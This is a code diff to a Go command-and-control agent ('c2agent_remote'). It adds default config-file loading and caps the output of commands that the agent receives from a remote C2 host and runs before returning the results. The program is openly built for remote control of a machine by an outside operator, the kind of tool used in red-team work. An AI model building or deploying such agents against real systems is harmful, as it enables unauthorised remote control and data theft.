@@ -24,6 +24,8 @@ import (
 	"time"
 )
 
+const defaultConfigPath = "config.json"
+
 type options struct {
 	configPath       string
 	c2Address        string
@@ -36,6 +38,7 @@ type options struct {
 }
 
 func (o *options) init() {
+	o.configPath = defaultConfigPath
 	o.heartbeat = 30
 	o.cmdTimeout = 60
 	o.reconnectInitial = 1
@@ -94,15 +97,22 @@ func main() {
 	o.init()
 
 	// First pass: load the config file so its values become flag defaults.
+	loaded := false
 	for i := 1; i+1 < len(os.Args); i++ {
 		if os.Args[i] == "--config" || os.Args[i] == "-config" {
 			o.configPath = os.Args[i+1]
+			loadConfigFile(o.configPath, &o)
+			loaded = true
+		}
+	}
+	if !loaded {
+		if _, err := os.Stat(o.configPath); err == nil {
 			loadConfigFile(o.configPath, &o)
 		}
 	}
 
 	fs := flag.NewFlagSet("c2agent_remote", flag.ExitOnError)
-	fs.StringVar(&o.configPath, "config", o.configPath, "optional JSON config file")
+	fs.StringVar(&o.configPath, "config", o.configPath, "JSON config file (default config.json)")
 	fs.StringVar(&o.c2Address, "c2-address", o.c2Address, "C2 host:port (required)")
 	fs.StringVar(&o.agentID, "agent-id", o.agentID, "unique agent id (required)")
 	fs.StringVar(&o.authToken, "auth-token", o.authToken, "pre-shared auth token (required)")
@@ -333,7 +343,7 @@ func dispatch(conn net.Conn, pr *packetReader, pkt *packet, o *options) dispatch
 			_ = send(conn, buildResponse(pkt.reqID, pkt.cmd, "Error: bad TLV"))
 			return cont
 		}
-		result := runAction(pkt.cmd, params, time.Duration(o.cmdTimeout)*time.Second)
+		result := capOutput(runAction(pkt.cmd, params, time.Duration(o.cmdTimeout)*time.Second), false)
 		_ = send(conn, buildResponse(pkt.reqID, pkt.cmd, result))
 		return cont
 	}
